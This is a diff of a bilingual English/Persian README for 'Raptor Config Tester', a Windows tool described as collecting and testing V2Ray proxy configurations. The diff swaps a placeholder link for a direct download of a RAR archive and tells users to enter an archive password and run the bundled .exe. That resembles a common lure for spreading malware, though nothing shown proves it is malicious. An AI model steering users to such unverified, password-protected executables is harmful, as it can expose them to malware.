@@ -1,5 +1,4 @@
-
-<div align="center">
+ <div align="center">
 
 <img src="assets/header.svg" width="100%" alt="Raptor Config Tester"/>
 
@@ -13,7 +12,7 @@
 
 <br/><br/>
 
-<a href="https://github.com/USERNAME/Raptor-Config-Tester/releases/latest">
+<a href="https://github.com/nukcrow/Raptor-Config-Tester/releases/download/v1.0.0/RaptorConfigTester.rar">
 <img src="https://img.shields.io/badge/DOWNLOAD-RAPTOR_CONFIG_TESTER-1b1f24?style=for-the-badge&logo=github&logoColor=8A8F98&labelColor=050505"/>
 </a>
 
@@ -25,15 +24,15 @@
 
 ---
 
-## 🐦‍⬛ ABOUT | درباره برنامه
+## ABOUT | درباره برنامه
 
-### 🇬🇧 English
+### English
 
 **Raptor Config Tester** is a Windows tool designed to collect, organize, test, and identify working V2Ray-compatible configurations from public GitHub repositories.
 
 It provides an easy way to discover configurations, remove duplicates, check connectivity, and export working results.
 
-### 🇮🇷 فارسی
+### فارسی
 
 **Raptor Config Tester** یک ابزار ویندوزی برای جمع‌آوری، مرتب‌سازی، آزمایش و شناسایی کانفیگ‌های سازگار با V2Ray از مخازن عمومی GitHub است.
 
@@ -41,20 +40,20 @@ It provides an easy way to discover configurations, remove duplicates, check con
 
 ---
 
-## ⚡ FEATURES | امکانات
+## FEATURES | امکانات
 
 | Feature | توضیحات |
 |:---|:---|
-| 🔎 Auto Collection | جمع‌آوری خودکار لینک کانفیگ‌ها |
-| 🧹 Duplicate Removal | حذف کانفیگ‌های تکراری |
-| ⚡ TCP Port Check | بررسی اختیاری پورت TCP |
-| 🧪 Tunnel Testing | آزمایش اتصال تونل |
-| 📊 Result Categories | دسته‌بندی نتایج تست |
-| 📄 TXT Export | خروجی گرفتن کانفیگ‌های سالم |
+| Auto Collection | جمع‌آوری خودکار لینک کانفیگ‌ها |
+| Duplicate Removal | حذف کانفیگ‌های تکراری |
+| TCP Port Check | بررسی اختیاری پورت TCP |
+| Tunnel Testing | آزمایش اتصال تونل |
+| Result Categories | دسته‌بندی نتایج تست |
+| TXT Export | خروجی گرفتن کانفیگ‌های سالم |
 
 ---
 
-## 📡 SUPPORTED PROTOCOLS | پروتکل‌های پشتیبانی‌شده
+## SUPPORTED PROTOCOLS | پروتکل‌های پشتیبانی‌شده
 
 <div align="center">
 
@@ -67,30 +66,30 @@ It provides an easy way to discover configurations, remove duplicates, check con
 
 ---
 
-## 📊 TEST RESULTS | نتایج آزمایش
+## TEST RESULTS | نتایج آزمایش
 
 | Status | Description | توضیحات |
 |:---|:---|:---|
-| 🟢 Working | Connection successful | اتصال موفق |
-| 🟡 No Internet | Internet unavailable | عدم دسترسی به اینترنت |
-| 🔴 Dead / Error | Connection failed | اتصال ناموفق یا خطا |
+| Working | Connection successful | اتصال موفق |
+| No Internet | Internet unavailable | عدم دسترسی به اینترنت |
+| Dead / Error | Connection failed | اتصال ناموفق یا خطا |
 
 ---
 
-## 🚀 HOW TO USE | راهنمای استفاده
+## HOW TO USE | راهنمای استفاده
 
-### 🇬🇧 English
+### English
 
-1. Download the ZIP archive.
+1. Download the ZIP or RAR archive.
 2. Extract the archive using WinRAR or 7-Zip.
 3. Enter the archive password if requested.
 4. Run `RaptorConfigTester.exe`.
 5. Start collecting and testing configurations.
 6. Export working configurations to TXT.
 
-### 🇮🇷 فارسی
+### فارسی
 
-۱. فایل ZIP نرم‌افزار را دانلود کنید.
+۱. فایل آرشیو نرم‌افزار را دانلود کنید.
 
 ۲. فایل را با WinRAR یا 7-Zip استخراج کنید.
 
@@ -104,7 +103,7 @@ It provides an easy way to discover configurations, remove duplicates, check con
 
 ---
 
-## 💻 REQUIREMENTS | پیش‌نیازها
+## REQUIREMENTS | پیش‌نیازها
 
 - Operating System: Windows
 - Internet connection: Required
@@ -112,7 +111,7 @@ It provides an easy way to discover configurations, remove duplicates, check con
 
 ---
 
-## 📥 DOWNLOAD | دانلود نرم‌افزار
+## DOWNLOAD | دانلود نرم‌افزار
 
 <div align="center">
 
@@ -120,27 +119,33 @@ It provides an easy way to discover configurations, remove duplicates, check con
 
 **Find configurations. Test connections. Export results.**
 
-<a href="https://github.com/USERNAME/Raptor-Config-Tester/releases/latest">
-<img src="https://img.shields.io/badge/⬇_DOWNLOAD-LATEST_RELEASE-1b1f24?style=for-the-badge&logo=github&logoColor=8A8F98&labelColor=050505"/>
+<a href="https://github.com/nukcrow/Raptor-Config-Tester/releases/download/v1.0.0/RaptorConfigTester.rar">
+<img src="https://img.shields.io/badge/DOWNLOAD-LATEST_VERSION-1b1f24?style=for-the-badge&logo=github&logoColor=8A8F98&labelColor=050505"/>
 </a>
 
 <br/><br/>
 
-<sub>Windows · Version 1.0.0 · ZIP Archive</sub>
+<a href="https://github.com/nukcrow/Raptor-Config-Tester/releases/tag/v1.0.0">
+View Release Details
+</a>
+
+<br/><br/>
+
+<sub>Windows | Version 1.0.0 | RAR Archive</sub>
 
 </div>
 
 ---
 
-## 🔐 SECURITY NOTICE | نکات امنیتی
+## SECURITY NOTICE | نکات امنیتی
 
-### 🇬🇧 English
+### English
 
 Public configurations may be unreliable, temporary, or potentially unsafe.
 
 Only use configurations and network resources you are authorized to access. Review downloaded files before running them.
 
-### 🇮🇷 فارسی
+### فارسی
 
 کانفیگ‌های عمومی ممکن است ناپایدار، موقتی یا ناامن باشند.
 
@@ -148,7 +153,7 @@ Only use configurations and network resources you are authorized to access. Revi
 
 ---
 
-## ⚠️ DISCLAIMER | سلب مسئولیت
+## DISCLAIMER | سلب مسئولیت
 
 This software is intended for educational purposes and authorized network testing.
 
@@ -164,8 +169,8 @@ Users are responsible for complying with applicable laws and third-party service
 
 <br/>
 
-**🐦‍⬛ RAPTOR CONFIG TESTER**
+**RAPTOR CONFIG TESTER**
 
-<sub>Version 1.0.0 · Windows</sub>
+<sub>Version 1.0.0 | Windows</sub>
 
 </div>
